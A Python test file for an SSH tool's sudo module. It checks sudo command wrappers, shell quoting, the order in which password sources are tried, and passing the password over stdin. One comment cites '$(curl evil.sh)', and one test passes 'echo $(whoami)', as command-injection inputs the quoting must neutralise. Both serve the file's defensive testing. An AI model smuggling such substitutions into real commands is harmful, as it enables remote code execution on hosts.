"""ssh/sudo -- wrapper shapes, password sourcing priority, per-call vs script."""
from __future__ import annotations

import subprocess
from dataclasses import dataclass
from typing import Any
from unittest.mock import patch

import pytest

from ssh_mcp.config import Settings
from ssh_mcp.ssh.sudo import (
    build_sudo_script_wrapper,
    build_sudo_wrapper,
    fetch_sudo_password,
    run_sudo,
    run_sudo_script,
)


def _settings(**overrides: object) -> Settings:
    defaults: dict[str, object] = {
        "SSH_HOSTS_ALLOWLIST": ["web01.internal"],
        "SSH_HOSTS_FILE": None,
        "SSH_SUDO_PASSWORD_CMD": None,
        "SSH_SUDO_MODE": "per-call",
    }
    defaults.update(overrides)
    return Settings(**defaults)  # type: ignore[arg-type]


# --- build_sudo_wrapper ---


def test_passwordless_wrapper_uses_n_flag() -> None:
    args, stdin = build_sudo_wrapper("systemctl reload nginx", password=None)
    assert args == "sudo -n -- sh -c 'systemctl reload nginx'"
    assert stdin is None


def test_password_wrapper_uses_S_and_pipes_password() -> None:
    args, stdin = build_sudo_wrapper("systemctl reload nginx", password="hunter2")
    assert args == "sudo -S -p '' -- sh -c 'systemctl reload nginx'"
    assert stdin == "hunter2\n"


def test_wrapper_quotes_command_with_shell_metacharacters() -> None:
    # The quoting must prevent `$(curl evil.sh)` from being evaluated.
    args, _ = build_sudo_wrapper("echo $(whoami)", password=None)
    # shlex.quote wraps in single quotes and escapes existing single quotes.
    assert args == "sudo -n -- sh -c 'echo $(whoami)'"


def test_wrapper_handles_command_with_single_quotes() -> None:
    args, _ = build_sudo_wrapper("echo 'hi there'", password=None)
    # shlex.quote escapes embedded single quotes using '"'"' pattern.
    assert "echo" in args
    assert "'\"'\"'" in args


# --- build_sudo_script_wrapper ---


def test_script_wrapper_passwordless() -> None:
    args, prefix = build_sudo_script_wrapper(password=None)
    assert args == "sudo -n -- sh -s --"
    assert prefix == ""


def test_script_wrapper_with_password_prepends_password_line() -> None:
    args, prefix = build_sudo_script_wrapper(password="hunter2")
    assert args == "sudo -S -p '' -- sh -s --"
    assert prefix == "hunter2\n"


# --- fetch_sudo_password priority ---


def test_password_cmd_takes_priority() -> None:
    class Ret:
        returncode = 0
        stdout = "from-cmd\n"
        stderr = ""

    with patch("ssh_mcp.ssh.sudo.subprocess.run", return_value=Ret()):
        pw = fetch_sudo_password(_settings(SSH_SUDO_PASSWORD_CMD="pass show ops/sudo"))
    assert pw == "from-cmd"


def test_password_cmd_failure_falls_through(monkeypatch: pytest.MonkeyPatch) -> None:
    class Ret:
        returncode = 1
        stdout = ""
        stderr = "pass error"

    monkeypatch.delenv("SSH_SUDO_PASSWORD", raising=False)
    with patch("ssh_mcp.ssh.sudo.subprocess.run", return_value=Ret()):
        pw = fetch_sudo_password(_settings(SSH_SUDO_PASSWORD_CMD="bad cmd"))
    # No keyring, no env → passwordless.
    assert pw is None


def test_env_password_is_ignored_by_fetch(monkeypatch: pytest.MonkeyPatch) -> None:
    # INC-009: SSH_SUDO_PASSWORD is rejected at lifespan startup. fetch()
    # itself ignores it so a rogue env var cannot silently take effect.
    monkeypatch.setenv("SSH_SUDO_PASSWORD", "env-pw")
    assert fetch_sudo_password(_settings()) is None


def test_reject_env_password_raises_at_startup(monkeypatch: pytest.MonkeyPatch) -> None:
    from ssh_mcp.ssh.errors import AuthenticationFailed
    from ssh_mcp.ssh.sudo import reject_env_password

    monkeypatch.setenv("SSH_SUDO_PASSWORD", "env-pw")
    with pytest.raises(AuthenticationFailed, match="rejected"):
        reject_env_password()


def test_reject_env_password_passes_when_unset(monkeypatch: pytest.MonkeyPatch) -> None:
    from ssh_mcp.ssh.sudo import reject_env_password

    monkeypatch.delenv("SSH_SUDO_PASSWORD", raising=False)
    reject_env_password()  # no raise


def test_no_source_returns_none(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("SSH_SUDO_PASSWORD", raising=False)
    assert fetch_sudo_password(_settings()) is None


def test_password_cmd_timeout_propagates(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("SSH_SUDO_PASSWORD", raising=False)

    def _raise(*_: Any, **__: Any) -> None:
        raise subprocess.TimeoutExpired(cmd="x", timeout=10)

    with (
        patch("ssh_mcp.ssh.sudo.subprocess.run", side_effect=_raise),
        pytest.raises(subprocess.TimeoutExpired),
    ):
        fetch_sudo_password(_settings(SSH_SUDO_PASSWORD_CMD="stuck"))


# --- run_sudo / run_sudo_script plumb through to exec.run ---


@dataclass
class FakeRunResult:
    stdout: str = "ok\n"
    stderr: str = ""
    exit_status: int | None = 0
    signal: str | None = None


class FakeConn:
    def __init__(self) -> None:
        self.calls: list[dict[str, Any]] = []

    async def run(
        self,
        args: str,
        *,
        check: bool = False,
        input: Any = None,
        timeout: Any = None,
    ) -> FakeRunResult:
        self.calls.append({"args": args, "input": input})
        return FakeRunResult()


@pytest.mark.asyncio
async def test_run_sudo_pipes_password_on_stdin() -> None:
    conn = FakeConn()
    await run_sudo(
        conn,  # type: ignore[arg-type]
        "systemctl status nginx",
        host="web01",
        timeout=5.0,
        stdout_cap=1024,
        stderr_cap=1024,
        password="hunter2",
    )
    assert conn.calls[0]["args"] == "sudo -S -p '' -- sh -c 'systemctl status nginx'"
    assert conn.calls[0]["input"] == "hunter2\n"


@pytest.mark.asyncio
async def test_run_sudo_passwordless_omits_stdin() -> None:
    conn = FakeConn()
    await run_sudo(
        conn,  # type: ignore[arg-type]
        "systemctl status nginx",
        host="web01",
        timeout=5.0,
        stdout_cap=1024,
        stderr_cap=1024,
        password=None,
    )
    assert conn.calls[0]["args"] == "sudo -n -- sh -c 'systemctl status nginx'"
    assert conn.calls[0]["input"] is None


@pytest.mark.asyncio
async def test_run_sudo_script_concatenates_password_and_body() -> None:
    conn = FakeConn()
    await run_sudo_script(
        conn,  # type: ignore[arg-type]
        "echo hello\nexit 0\n",
        host="web01",
        timeout=5.0,
        stdout_cap=1024,
        stderr_cap=1024,
        password="hunter2",
    )
    assert conn.calls[0]["args"] == "sudo -S -p '' -- sh -s --"
    assert conn.calls[0]["input"] == "hunter2\necho hello\nexit 0\n"


@pytest.mark.asyncio
async def test_run_sudo_script_passwordless_still_sends_body() -> None:
    conn = FakeConn()
    await run_sudo_script(
        conn,  # type: ignore[arg-type]
        "id\n",
        host="web01",
        timeout=5.0,
        stdout_cap=1024,
        stderr_cap=1024,
        password=None,
    )
    assert conn.calls[0]["args"] == "sudo -n -- sh -s --"
    assert conn.calls[0]["input"] == "id\n"
